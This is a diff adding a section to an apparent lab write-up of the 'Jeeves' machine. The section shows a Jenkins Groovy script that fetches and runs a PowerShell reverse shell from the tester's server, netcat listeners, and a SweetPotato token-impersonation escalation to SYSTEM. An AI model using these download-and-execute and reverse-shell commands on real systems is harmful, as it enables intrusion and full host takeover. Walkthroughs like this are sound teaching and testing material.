@@ -105,8 +105,119 @@ Output: jeeves\kohsuke
 Exit code: 0
 ```
 
-The tester next gained a shell on the host by firest downloading the powershell 
+The tester next gained a shell on the host by downloading and invoking a powershell shell. The Tester used the nishang tool set that contained a series of powershell shells. The tester set up a HTTP server using python and a Netcat listener then used the beolow script to download and run the shell.
+
+```
+def process = "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8083/Invoke-PowerShellTcp.ps1')".execute()
+print "Output: " + process.text
+print "Exit code: " + process.exitValue()
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 8084
+listening on [any] 8084 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.63] 49680
+Windows PowerShell running as user kohsuke on JEEVES
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\.jenkins>hostname
+Jeeves
+PS C:\Users\Administrator\.jenkins> whoami
+jeeves\kohsuke
+PS C:\Users\Administrator\.jenkins> 
+```
+
+This gave access to the host as the "kohsuke" user. The tester checked the users privileges and found that the user had the SeImpersonatePrivilege privilege. This privilege allows a user to imperonate process tokens.
+
+
+```
+PS C:\Users\Administrator\.jenkins> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+PS C:\Users\Administrator\.jenkins> 
+```
+
+The tester used the "sweetpotato" binary to exploit this vulnerability and get system. The tester used another HTTP server to download the binary.
+
+
+```
+PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
+```
+
+```
+┌──(kali㉿kali)-[~/…/tools/priv_esc/windows/binaries]
+└─$ python -m http.server 8080                                
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.10.63 - - [23/Dec/2023 18:03:34] code 404, message File not found
+10.10.10.63 - - [23/Dec/2023 18:03:34] "GET /sweetpotato.exe HTTP/1.1" 404 -
+10.10.10.63 - - [23/Dec/2023 18:03:56] "GET /SweetPotato.exe HTTP/1.1" 200 -
+
+```
+Once the binary had been downloaded the tester tested the exploit by running the "whoami" command with it which return the system account. The tester used the same process used previouly to get get a system shell. 
+
+```
+PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
+PS C:\users\public\music> ./sweetpotato.exe -a whoami
+Modifying SweetPotato by Uknow to support webshell
+Github: https://github.com/uknowsec/SweetPotato 
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\Jeeves/pipe/1b14b892-4acd-461d-8f4d-30d7665e1b02
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] CreatePipe success
+[+] Command : "c:\Windows\System32\cmd.exe" /c whoami 
+[+] process with pid: 3212 created.
+
+=====================================
+
+nt authority\system
+
+
+[+] Process created, enjoy!
+PS C:\users\public\music> 
+
+```
+The tester ran the download and invoke command using the exploit binary which gave a system shell.
+```
+PS C:\users\public\music> ./sweetpotato.exe -a "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:8080/Invoke-PowerShellTcp.ps1')"  
+```
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 8085        
+listening on [any] 8085 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.63] 49688
+Windows PowerShell running as user JEEVES$ on JEEVES
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+Jeeves
+PS C:\Windows\system32> 
+```
+
 
 ## Mitigations 
 
 ## References
+https://github.com/uknowsec/SweetPotato
+https://github.com/samratashok/nishang
